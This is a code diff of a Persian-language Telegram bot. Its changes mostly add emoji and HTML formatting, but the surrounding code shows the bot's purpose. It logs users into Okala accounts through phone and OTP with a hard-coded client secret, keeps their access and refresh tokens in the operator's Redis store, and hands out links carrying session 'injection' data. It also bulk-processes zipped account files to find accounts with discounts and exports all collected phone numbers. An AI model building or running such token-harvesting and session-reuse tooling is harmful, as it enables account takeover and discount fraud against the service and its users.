@@ -165,11 +165,11 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     file_name = update.message.document.file_name.lower()
     if not file_name.endswith('.zip'):
-        await update.message.reply_text("فایل ارسالی نامعتبر است. لطفا فایل زیپ (.zip) ارسال کنید.")
+        await update.message.reply_text("❌ فایل ارسالی نامعتبر است. لطفاً فایل زیپ (.zip) ارسال کنید.")
         return
         
     action = context.user_data.get('admin_zip_action', 'zip_to_link')
-    msg = await update.message.reply_text("در حال دریافت و استخراج فایل...")
+    msg = await update.message.reply_text("⏳ در حال دریافت و استخراج فایل...")
     
     expire_time = await redis_client.get("settings:expire_time")
     expire_time = int(expire_time) if expire_time else 7200
@@ -190,16 +190,16 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 break
                 
         if not src_accounts:
-            await msg.edit_text("پوشه 'accounts' در فایل زیپ یافت نشد.")
+            await msg.edit_text("⚠️ پوشه 'accounts' در فایل زیپ یافت نشد.")
             return
 
         json_files = sorted([f for f in os.listdir(src_accounts) if f.endswith('.json')])
         if not json_files:
-            await msg.edit_text("هیچ فایل JSON معتبری در پوشه یافت نشد.")
+            await msg.edit_text("⚠️ هیچ فایل JSON معتبری در پوشه یافت نشد.")
             return
 
         if action == 'zip_to_link':
-            links_text = "لیست لینک‌های تولید شده:\n\n"
+            links_text = "<b>لیست لینک‌های تولید شده:</b>\n\n"
             count = 0
             for filename in json_files:
                 file_path = os.path.join(src_accounts, filename)
@@ -222,23 +222,23 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                         link_id = str(uuid.uuid4())[:12]
                         await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                         final_url = f"{WEB_DOMAIN}/acc/{link_id}"
-                        links_text += f"شماره {phone}:\n{final_url}\n\n"
+                        links_text += f"📱 <b>شماره {phone}:</b>\n{final_url}\n\n"
                         count += 1
                 except Exception:
                     pass
             if len(links_text) > 4000:
                 file_out = io.BytesIO(links_text.encode('utf-8'))
                 file_out.name = f"Links_{int(time.time())}.txt"
-                await context.bot.send_document(chat_id=user_id, document=file_out, caption=f"استخراج {count} اکانت انجام شد.")
+                await context.bot.send_document(chat_id=user_id, document=file_out, caption=f"✅ استخراج {count} اکانت انجام شد.")
                 await msg.delete()
             else:
-                await msg.edit_text(f"تعداد {count} اکانت ذخیره شد:\n\n{links_text}", disable_web_page_preview=True)
+                await msg.edit_text(f"✅ <b>تعداد {count} اکانت ذخیره شد:</b>\n\n{links_text}", disable_web_page_preview=True, parse_mode='HTML')
 
         elif action == 'zip_discount_check':
-            await msg.edit_text("در حال بررسی وضعیت تخفیف‌ها. لطفا منتظر بمانید...")
+            await msg.edit_text("🔍 در حال بررسی وضعیت تخفیف‌ها. لطفاً منتظر بمانید...")
             discount_dir = os.path.join(temp_dir, "Discount_Accounts")
             os.makedirs(os.path.join(discount_dir, 'accounts'), exist_ok=True)
-            links_text = "لیست لینک‌های دارای تخفیف:\n\n"
+            links_text = "<b>لیست لینک‌های دارای تخفیف:</b>\n\n"
             discount_count = 0
             for filename in json_files:
                 file_path = os.path.join(src_accounts, filename)
@@ -267,7 +267,7 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                                     link_id = str(uuid.uuid4())[:12]
                                     await redis_client.setex(f"acc_link:{link_id}", expire_time, file_content)
                                     phone = filename.replace('.json', '')
-                                    links_text += f"شماره {phone}:\n{WEB_DOMAIN}/acc/{link_id}\n\n"
+                                    links_text += f"📱 <b>شماره {phone}:</b>\n{WEB_DOMAIN}/acc/{link_id}\n\n"
                 except Exception:
                     pass
             if discount_count > 0:
@@ -275,15 +275,15 @@ async def handle_zip_upload(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await asyncio.to_thread(shutil.make_archive, discount_zip_path, 'zip', discount_dir)
                 await msg.delete()
                 with open(discount_zip_path + '.zip', 'rb') as zip_file:
-                    await context.bot.send_document(chat_id=user_id, document=zip_file, caption=f"فایل خروجی (فیلتر شده)\nتعداد اکانت‌های دارای تخفیف: {discount_count}")
+                    await context.bot.send_document(chat_id=user_id, document=zip_file, caption=f"🎁 <b>فایل خروجی (فیلتر شده)</b>\nتعداد اکانت‌های دارای تخفیف: {discount_count}", parse_mode='HTML')
                 if len(links_text) > 4000:
                     file_out = io.BytesIO(links_text.encode('utf-8'))
                     file_out.name = f"Discount_Links_{int(time.time())}.txt"
-                    await context.bot.send_document(chat_id=user_id, document=file_out, caption="لینک‌های دسترسی سریع")
+                    await context.bot.send_document(chat_id=user_id, document=file_out, caption="🔗 لینک‌های دسترسی سریع")
                 else:
-                    await context.bot.send_message(chat_id=user_id, text=links_text, disable_web_page_preview=True)
+                    await context.bot.send_message(chat_id=user_id, text=links_text, disable_web_page_preview=True, parse_mode='HTML')
             else:
-                await msg.edit_text("هیچ‌یک از اکانت‌های موجود دارای تخفیف نبودند.")
+                await msg.edit_text("⚠️ هیچ‌یک از اکانت‌های موجود دارای تخفیف نبودند.")
 
 # ==========================================
 # مینی‌سرور وب
@@ -308,35 +308,35 @@ async def start_web_server():
 # منوها و دکمه‌ها
 # ==========================================
 def get_main_keyboard(is_admin_user):
-    keyboard = [[InlineKeyboardButton("ورود به حساب", callback_data="user_login")]]
+    keyboard = [[InlineKeyboardButton("🔑 ورود به حساب", callback_data="user_login")]]
     if is_admin_user:
-        keyboard.append([InlineKeyboardButton("پنل مدیریت", callback_data="admin_panel")])
+        keyboard.append([InlineKeyboardButton("⚙️ پنل مدیریت", callback_data="admin_panel")])
     return InlineKeyboardMarkup(keyboard)
 
 def get_admin_keyboard():
     keyboard = [
-        [InlineKeyboardButton("آمار دیتابیس", callback_data="admin_stats"), InlineKeyboardButton("تنظیم انقضا", callback_data="admin_expire")],
-        [InlineKeyboardButton("بررسی تخفیف دیتابیس", callback_data="admin_check_discounts")],
-        [InlineKeyboardButton("تبدیل زیپ به لینک", callback_data="admin_zip_to_link"), InlineKeyboardButton("بررسی تخفیف زیپ", callback_data="admin_zip_discount")],
-        [InlineKeyboardButton("استخراج شماره‌ها", callback_data="admin_export"), InlineKeyboardButton("پاکسازی دیتابیس", callback_data="admin_clear")],
-        [InlineKeyboardButton("روشن/خاموش کردن", callback_data="admin_toggle")],
-        [InlineKeyboardButton("بازگشت به منوی اصلی", callback_data="main_menu")]
+        [InlineKeyboardButton("📊 آمار دیتابیس", callback_data="admin_stats"), InlineKeyboardButton("⏳ تنظیم انقضا", callback_data="admin_expire")],
+        [InlineKeyboardButton("🎁 بررسی تخفیف دیتابیس", callback_data="admin_check_discounts")],
+        [InlineKeyboardButton("🔗 تبدیل زیپ به لینک", callback_data="admin_zip_to_link"), InlineKeyboardButton("🔍 بررسی تخفیف زیپ", callback_data="admin_zip_discount")],
+        [InlineKeyboardButton("📥 استخراج شماره‌ها", callback_data="admin_export"), InlineKeyboardButton("🗑 پاکسازی دیتابیس", callback_data="admin_clear")],
+        [InlineKeyboardButton("⏸ روشن/خاموش کردن", callback_data="admin_toggle")],
+        [InlineKeyboardButton("🔙 بازگشت به منوی اصلی", callback_data="main_menu")]
     ]
     return InlineKeyboardMarkup(keyboard)
 
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
     admin_status = is_admin(user_id)
-    text = "به سیستم مدیریت حساب خوش آمدید.\nلطفا یک گزینه را انتخاب کنید:"
+    text = "👋 <b>به سیستم لینک ساز خوش آمدید.</b>\n\nلطفاً یک گزینه را انتخاب کنید:"
     if update.message:
-        await update.message.reply_text(text, reply_markup=get_main_keyboard(admin_status))
+        await update.message.reply_text(text, reply_markup=get_main_keyboard(admin_status), parse_mode='HTML')
     else:
-        await update.callback_query.edit_message_text(text, reply_markup=get_main_keyboard(admin_status))
+        await update.callback_query.edit_message_text(text, reply_markup=get_main_keyboard(admin_status), parse_mode='HTML')
 
 async def admin_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not is_admin(update.effective_user.id): return
     context.user_data['admin_zip_action'] = None
-    await update.message.reply_text("پنل مدیریت سیستم:", reply_markup=get_admin_keyboard())
+    await update.message.reply_text("⚙️ <b>پنل مدیریت سیستم:</b>", reply_markup=get_admin_keyboard(), parse_mode='HTML')
 
 async def core_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     query = update.callback_query
@@ -352,7 +352,7 @@ async def core_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
     
     if data == "admin_panel":
         context.user_data['admin_zip_action'] = None
-        await query.edit_message_text("پنل مدیریت سیستم:", reply_markup=get_admin_keyboard())
+        await query.edit_message_text("⚙️ <b>پنل مدیریت سیستم:</b>", reply_markup=get_admin_keyboard(), parse_mode='HTML')
         
     elif data == "admin_stats":
         acc_keys = await redis_client.keys("account:*")
@@ -361,66 +361,73 @@ async def core_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         exp = await redis_client.get("settings:expire_time")
         exp = int(exp) if exp else 7200
         exp_str = f"{exp // 86400} روز" if exp >= 86400 else f"{exp // 3600} ساعت"
-        status = "غیرفعال" if maint == "1" else "فعال"
-        text = f"وضعیت سیستم:\n\nتعداد کل اکانت‌ها: {len(acc_keys)}\nلینک‌های فعال: {len(link_keys)}\nزمان انقضا: {exp_str}\nوضعیت ربات: {status}"
-        await query.edit_message_text(text, reply_markup=get_admin_keyboard())
+        status = "غیرفعال 🔴" if maint == "1" else "فعال 🟢"
+        
+        text = (
+            "📊 <b>وضعیت سیستم:</b>\n\n"
+            f"👤 <b>تعداد کل اکانت‌ها:</b> <code>{len(acc_keys)}</code>\n"
+            f"🔗 <b>لینک‌های فعال:</b> <code>{len(link_keys)}</code>\n"
+            f"⏳ <b>زمان انقضای لینک‌ها:</b> {exp_str}\n"
+            f"🤖 <b>وضعیت ربات:</b> {status}"
+        )
+        await query.edit_message_text(text, reply_markup=get_admin_keyboard(), parse_mode='HTML')
         
     elif data == "admin_expire":
         kb = [
-            [InlineKeyboardButton("۱ ساعت", callback_data="set_exp_3600"), InlineKeyboardButton("۲۴ ساعت", callback_data="set_exp_86400")],
-            [InlineKeyboardButton("۱ هفته", callback_data="set_exp_604800"), InlineKeyboardButton("۱ ماه", callback_data="set_exp_2592000")],
-            [InlineKeyboardButton("بازگشت", callback_data="admin_panel")]
+            [InlineKeyboardButton("۱ ساعت ⏱", callback_data="set_exp_3600"), InlineKeyboardButton("۲۴ ساعت 🕐", callback_data="set_exp_86400")],
+            [InlineKeyboardButton("۱ هفته 📅", callback_data="set_exp_604800"), InlineKeyboardButton("۱ ماه 📆", callback_data="set_exp_2592000")],
+            [InlineKeyboardButton("🔙 بازگشت", callback_data="admin_panel")]
         ]
-        await query.edit_message_text("زمان انقضای لینک‌ها را تعیین کنید:", reply_markup=InlineKeyboardMarkup(kb))
+        await query.edit_message_text("⏳ <b>زمان انقضای لینک‌ها را تعیین کنید:</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
         
     elif data.startswith("set_exp_"):
         new_time = int(data.split("_")[2])
         await redis_client.set("settings:expire_time", new_time)
         exp_str = f"{new_time // 86400} روز" if new_time >= 86400 else f"{new_time // 3600} ساعت"
-        await query.edit_message_text(f"انقضای لینک‌ها با موفقیت به {exp_str} تغییر یافت.", reply_markup=get_admin_keyboard())
+        await query.edit_message_text(f"✅ انقضای لینک‌ها با موفقیت به <b>{exp_str}</b> تغییر یافت.", reply_markup=get_admin_keyboard(), parse_mode='HTML')
 
     elif data == "admin_check_discounts":
         acc_keys = await redis_client.keys("account:*")
         if not acc_keys:
-            await query.message.reply_text("دیتابیس سیستم خالی است.")
+            await query.message.reply_text("⚠️ دیتابیس سیستم خالی است.")
             return
-        await query.message.reply_text("در حال پردازش اطلاعات. لطفا منتظر بمانید...")
+        await query.message.reply_text("⏳ در حال پردازش اطلاعات. لطفاً منتظر بمانید...")
         asyncio.create_task(process_discounts_and_send_report(context.bot, user_id, acc_keys))
         
     elif data == "admin_zip_to_link":
         context.user_data['admin_zip_action'] = 'zip_to_link'
-        await query.message.reply_text("عملیات استخراج لینک:\nلطفا فایل مربوطه را ارسال کنید.")
+        await query.message.reply_text("🔗 <b>عملیات استخراج لینک:</b>\nلطفاً فایل مربوطه را ارسال کنید.", parse_mode='HTML')
         
     elif data == "admin_zip_discount":
         context.user_data['admin_zip_action'] = 'zip_discount_check'
-        await query.message.reply_text("عملیات بررسی تخفیف:\nلطفا فایل مربوطه را ارسال کنید.")
+        await query.message.reply_text("🔍 <b>عملیات بررسی تخفیف:</b>\nلطفاً فایل مربوطه را ارسال کنید.", parse_mode='HTML')
 
     elif data == "admin_export":
         acc_keys = await redis_client.keys("account:*")
         if not acc_keys:
-            await query.message.reply_text("دیتابیس سیستم خالی است.")
+            await query.message.reply_text("⚠️ دیتابیس سیستم خالی است.")
             return
         export_text = "لیست شماره‌های ثبت شده در سیستم:\n\n"
         for key in acc_keys: export_text += f"{key.replace('account:', '')}\n"
         file_out = io.BytesIO(export_text.encode('utf-8'))
         file_out.name = f"Accounts_{int(time.time())}.txt"
-        await context.bot.send_document(chat_id=user_id, document=file_out, caption="فایل دیتابیس دریافت شد.")
+        await context.bot.send_document(chat_id=user_id, document=file_out, caption="📥 فایل دیتابیس دریافت شد.")
         
     elif data == "admin_clear":
-        kb = [[InlineKeyboardButton("تایید عملیات حذف", callback_data="admin_clear_confirm"), InlineKeyboardButton("انصراف", callback_data="admin_panel")]]
-        await query.edit_message_text("اخطار: این عملیات تمامی اطلاعات ثبت شده را حذف خواهد کرد. آیا تایید می‌کنید؟", reply_markup=InlineKeyboardMarkup(kb))
+        kb = [[InlineKeyboardButton("✅ تایید عملیات حذف", callback_data="admin_clear_confirm"), InlineKeyboardButton("❌ انصراف", callback_data="admin_panel")]]
+        await query.edit_message_text("⚠️ <b>اخطار:</b> این عملیات تمامی اطلاعات ثبت شده را حذف خواهد کرد.\nآیا تایید می‌کنید؟", reply_markup=InlineKeyboardMarkup(kb), parse_mode='HTML')
         
     elif data == "admin_clear_confirm":
         acc_keys = await redis_client.keys("account:*")
         if acc_keys: await redis_client.delete(*acc_keys)
-        await query.edit_message_text("عملیات پاکسازی با موفقیت انجام شد.", reply_markup=get_admin_keyboard())
+        await query.edit_message_text("🗑 عملیات پاکسازی با موفقیت انجام شد.", reply_markup=get_admin_keyboard())
         
     elif data == "admin_toggle":
         current = await redis_client.get("settings:maintenance")
         new_val = "0" if current == "1" else "1"
         await redis_client.set("settings:maintenance", new_val)
-        status = "غیرفعال (تعمیرات)" if new_val == "1" else "فعال"
-        await query.edit_message_text(f"تغییر وضعیت سیستم:\nوضعیت کنونی: {status}", reply_markup=get_admin_keyboard())
+        status = "غیرفعال (تعمیرات) 🔴" if new_val == "1" else "فعال 🟢"
+        await query.edit_message_text(f"⚙️ <b>تغییر وضعیت سیستم:</b>\nوضعیت کنونی: {status}", reply_markup=get_admin_keyboard(), parse_mode='HTML')
 
 # ==========================================
 # توابع لاگین کاربر
@@ -444,16 +451,16 @@ async def check_maintenance(update: Update) -> bool:
     user_id = update.effective_user.id if update.effective_user else 0
     if maint == "1" and not is_admin(user_id):
         if update.message:
-            await update.message.reply_text("سیستم در حال حاضر موقتا غیرفعال است.")
+            await update.message.reply_text("⛔️ سیستم لینک ساز در حال حاضر موقتاً غیرفعال است.")
         else:
-            await update.callback_query.message.reply_text("سیستم در حال حاضر موقتا غیرفعال است.")
+            await update.callback_query.message.reply_text("⛔️ سیستم لینک ساز در حال حاضر موقتاً غیرفعال است.")
         return True
     return False
 
 async def start_login_process(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     if await check_maintenance(update): return ConversationHandler.END
     await update.callback_query.answer()
-    await update.callback_query.edit_message_text("لطفا شماره موبایل خود را وارد کنید:")
+    await update.callback_query.edit_message_text("📱 <b>لطفاً شماره موبایل خود را وارد کنید:</b>", parse_mode='HTML')
     return PHONE
 
 async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
@@ -464,16 +471,16 @@ async def request_otp(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int
     payload = {"mobile": phone, "deviceTypeCode": 7, "confirmTerms": True, "notRobot": False, "otpType": 0, "ValidationCodeCreateReason": 5, "OtpApp": 0, "IsAppOnly": False}
     response = await async_request('POST', url, json=payload, headers=get_user_headers(context), timeout=15)
     if response.status_code == 200:
-        await update.message.reply_text("کد تایید ارسال شد. لطفا آن را وارد کنید:")
+        await update.message.reply_text("✉️ <b>کد تایید ارسال شد.</b>\nلطفاً آن را وارد کنید:", parse_mode='HTML')
         return OTP
     else:
-        await update.message.reply_text(f"خطا در ارتباط با سیستم عامل: {response.status_code}")
+        await update.message.reply_text(f"❌ خطا در ارتباط با سیستم: <code>{response.status_code}</code>", parse_mode='HTML')
         return ConversationHandler.END
 
 async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     otp_code = update.message.text.strip()
     phone = context.user_data.get('phone')
-    msg = await update.message.reply_text("در حال پردازش درخواست...")
+    msg = await update.message.reply_text("⏳ در حال پردازش درخواست...")
     token_url = "https://apigateway.okala.com/api/v1/accounts/tokens"
     payload = {"mobile_number": phone, "otp_code": otp_code, "grant_type": "customer_grant_type", "client_id": "customer_client_id", "client_secret": "u_M{'57j!%LI21#", "client_name": "customer_client_name", "device_type_code": 7, "scope": "offline_access", "loginDuration": 4815}
     headers = get_user_headers(context)
@@ -485,19 +492,19 @@ async def verify_otp_and_check_name(update: Update, context: ContextTypes.DEFAUL
         if auth_data.get("access_token"):
             await redis_client.hset(f"account:{phone}", mapping={"access_token": auth_data.get("access_token"), "refresh_token": auth_data.get("refresh_token")})
         if not auth_data.get("UserInfo", {}).get("HasName", False):
-            await msg.edit_text("اطلاعات حساب ناقص است. لطفا نام و نام خانوادگی خود را وارد کنید:")
+            await msg.edit_text("⚠️ <b>اطلاعات حساب ناقص است.</b>\nلطفاً نام و نام خانوادگی خود را وارد کنید:", parse_mode='HTML')
             return ASK_NAME
         else:
             return await generate_and_send_link(update, context, msg)
     else:
-        await msg.edit_text("کد وارد شده معتبر نمی‌باشد. لطفا مجددا تلاش کنید.")
+        await msg.edit_text("❌ کد وارد شده معتبر نمی‌باشد. لطفاً مجدداً تلاش کنید.")
         return ConversationHandler.END
 
 async def save_name_and_continue(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     full_name = update.message.text.strip()
     if not full_name: return ASK_NAME
     parts = full_name.split(maxsplit=1)
-    msg = await update.message.reply_text("در حال ثبت اطلاعات...")
+    msg = await update.message.reply_text("⏳ در حال ثبت اطلاعات...")
     url = "https://apigateway.okala.com/api/voyager/C/CustomerAccount/UpdateCustomer" 
     headers = get_user_headers(context)
     headers["Authorization"] = f"Bearer {context.user_data['auth_data'].get('access_token')}"
@@ -514,11 +521,17 @@ async def generate_and_send_link(update: Update, context: ContextTypes.DEFAULT_T
     await redis_client.setex(f"acc_link:{link_id}", expire_time, json.dumps(injection_json, ensure_ascii=False))
     final_url = f"{WEB_DOMAIN}/acc/{link_id}"
     exp_str = f"{expire_time // 86400} روز" if expire_time >= 86400 else f"{expire_time // 3600} ساعت"
-    await status_msg.edit_text(f"ورود با موفقیت انجام شد.\n\n{final_url}\n\n(لینک دریافتی تا {exp_str} آینده معتبر خواهد بود)", disable_web_page_preview=True)
+    
+    text = (
+        "✅ <b>ورود با موفقیت انجام شد.</b>\n\n"
+        f"🔗 {final_url}\n\n"
+        f"<i>(لینک دریافتی تا {exp_str} آینده معتبر خواهد بود)</i>"
+    )
+    await status_msg.edit_text(text, disable_web_page_preview=True, parse_mode='HTML')
     return ConversationHandler.END
 
 async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    await update.message.reply_text("عملیات متوقف شد.")
+    await update.message.reply_text("❌ عملیات متوقف شد.")
     return ConversationHandler.END
 
 # ==========================================
